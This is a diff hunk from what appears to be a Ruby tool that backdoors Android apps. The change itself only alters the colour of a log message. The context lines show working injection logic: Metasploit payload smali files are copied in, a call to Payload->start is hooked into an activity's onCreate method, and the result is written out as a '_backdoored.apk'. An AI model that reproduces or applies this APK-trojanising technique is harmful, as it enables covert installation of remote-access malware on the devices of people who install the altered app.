@@ -225,7 +225,7 @@ FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'ori
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
 payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
-print "[*]─➤ Loading ",smalifile," and injecting payload..\n".cyan
+print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..\n".cyan
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
 injected_apk=apkfile.split(".")[0]
 injected_apk+="_backdoored.apk"
